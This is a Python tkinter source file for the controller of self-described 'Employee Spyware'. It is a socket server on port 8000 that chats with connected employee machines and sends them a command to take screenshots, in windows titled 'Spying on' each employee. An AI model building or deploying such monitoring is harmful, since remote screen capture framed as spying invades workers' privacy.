# Must need:: 'spy.ico' icon image in same folder.

import socket  # socket
import _thread  # threading
import tkinter  # GUI properties
from tkinter import *  # GUI properties
from tkinter import filedialog  # GUI properties

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_hostname = socket.gethostname()
server_ip = socket.gethostbyname(server_hostname)
HOST = ''
PORT = 8000
s.bind((HOST, PORT))


def employee_thread(client_conn):  # main thread that separates employee
    employee = client_conn.recv(1024).decode('utf-8')

    def rcv_data():  # receive msg thread
        try:
            while True:
                data = client_conn.recv(1024).decode('utf-8')
                chat_log.config(state=NORMAL)
                chat_log.insert(END, '>____' + employee + ' :\n' + data)
                chat_log.see(END)
                chat_log.config(state=DISABLED)
                entry_box.delete(1.0, END)
        except Exception as temp:
            pass
        return 0

    def send_data():
        try:
            data = entry_box.get(1.0, END)
            chat_log.config(state=NORMAL)
            chat_log.insert(END, '>____You :\n' + data)
            chat_log.see(END)
            chat_log.config(state=DISABLED)
            entry_box.delete(1.0, END)
            client_conn.send(bytes(data, 'utf-8'))
        except Exception as temp:
            threadgui.destroy()
        return 0

    def send_case():
        try:
            client_conn.send(bytes('#' + str(k.get()), 'utf-8'))
        except Exception as temp:
            threadgui.destroy()

    def radio_1():
        k.set(1)

    def radio_2():
        k.set(2)

    def disable_event():
        threadgui.iconify()



    #################################################################################
    # Connected Client Thread GUI                                                   #
    #################################################################################
    _thread.start_new_thread(rcv_data, ())

    threadgui = tkinter.Tk()
    threadgui.title('Spying on ' + employee)
    threadgui.geometry("315x615+1020+10")  # width * height
    threadgui.iconbitmap('spy.ico')

    screenshots = Frame(threadgui)
    screenshots.pack(padx=10, anchor=W)
    chatbox = Frame(threadgui)
    chatbox.pack(anchor=W)

    # Create a Select Option frame
    tkinter.Label(screenshots, font=('Comic Sans MS', 10, 'bold'), text='Select any one:').pack(pady=10, anchor=W)
    k = IntVar()
    Radiobutton(screenshots, font=font_temp, text='1. Take screenshots Now.', value=1, variable=k, command=radio_1).pack(anchor=W)
    Radiobutton(screenshots, font=font_temp, text='2. Other Options. (Coming soon..)', value=2, variable=k, command=radio_2, state=DISABLED).pack(anchor=W)
    tkinter.Button(screenshots, font=('Comic Sans MS', 10, 'bold'), fg='#ffffff', bg='#4285F4', text='Send Input', command=send_case).pack(pady=10)
    tkinter.Label(screenshots, font=('Comic Sans MS', 10, 'bold'), text="Let's chat..").pack(anchor=W, pady=10)

    # Create a Chat window frame
    scrollbar = Scrollbar(chatbox, orient=VERTICAL)
    chat_log = Text(chatbox, font=font_temp, padx=10, pady=10, width=30, height=18, bg='#ffffff', wrap=WORD, yscrollcommand=scrollbar.set, state=DISABLED)
    scrollbar.config(command=chat_log.yview)
    entry_box = Text(chatbox, padx=10, width=25, height=3, bg='#ffffff', font=font_temp)
    send_btn = Button(chatbox, font=('Comic Sans MS', 10, 'bold'), fg='#ffffff', text="Send msg", bg='#4285F4', command=send_data)

    # Place all components on the screen
    chat_log.grid(row=0, column=0, columnspan=2, sticky=N+S+E+W)
    scrollbar.grid(row=0, column=2, sticky=N+S)
    entry_box.grid(row=1, column=0, pady=5)
    send_btn.grid(row=1, column=1, pady=5, sticky=N+S+E+W)

    threadgui.protocol("WM_DELETE_WINDOW", disable_event)
    threadgui.mainloop()
    #################################################################################
    return 0


def server_thread():
    global s
    s.listen(10)
    msg_lbl.configure(text='Server Started, Socket is listening!.. Yooo...')
    while True:
        try:
            client_conn, client_addr = s.accept()
            _thread.start_new_thread(employee_thread, (client_conn,))
        except Exception as temp:
            start_s.configure(state=NORMAL)
            stop_s.configure(state=DISABLED)
            break


def start_server():
    start_s.configure(state=DISABLED)
    stop_s.configure(state=NORMAL)
    _thread.start_new_thread(server_thread, ())


def stop_server():
    global s
    stop_s.configure(state=DISABLED)
    start_s.configure(state=NORMAL)
    s.close()
    exit(0)


#################################################################################
# BossPC Server GUI                                                             #
#################################################################################
# Extra Argument --
bg_temp = '#DDDDDD'
font_temp = ('Comic Sans MS', 10, '')
btn_color = '#DB4437'  # Google RED
# -----------------

window = tkinter.Tk()
window.title('Employee Spyware')
window.geometry("+400+200")
window.iconbitmap('spy.ico')
# window["bg"] = bg_temp

tkinter.Label(window, font=font_temp, text='Welcome to my first desktop Server App.').grid(row=0, column=0, padx=10, pady=10, columnspan=4)
tkinter.Label(window, font=('Comic Sans MS', 14, 'bold underline'), text='Properties').grid(row=1, column=0, padx=10, pady=10, columnspan=4, sticky=W)
tkinter.Label(window, font=font_temp, text='Your Hostname:').grid(row=2, column=0, padx=10, sticky=W)
tkinter.Label(window, font=font_temp, text=server_hostname).grid(row=2, column=1, padx=10, sticky=W)
tkinter.Label(window, font=font_temp, text='IPv4 Address:').grid(row=3, column=0, padx=10, sticky=W)
tkinter.Label(window, font=font_temp, text=server_ip).grid(row=3, column=1, padx=10, sticky=W)
tkinter.Label(window, font=font_temp, text='Port:').grid(row=4, column=0, padx=10, sticky=W)
tkinter.Label(window, font=font_temp, text=PORT).grid(row=4, column=1, padx=10, sticky=W)
start_s = tkinter.Button(window, font=('Comic Sans MS', 11, 'bold'), fg='#ffffff', bg='#DB4437', text='Start Server', command=start_server)
start_s.grid(row=2, column=2, padx=10, rowspan=2)
stop_s = tkinter.Button(window, font=('Comic Sans MS', 11, 'bold'), fg='#ffffff', bg='#DB4437', text='Stop Server', command=stop_server, state=DISABLED)
stop_s.grid(row=2, column=3, padx=10, rowspan=2)
msg_lbl = tkinter.Label(window, font=('Comic Sans MS', 10, 'bold italic'), bd=5, fg='#0F9D58', bg=bg_temp)
msg_lbl.grid(row=5, column=0, padx=10, pady=10, columnspan=4, sticky=W)

window.mainloop()
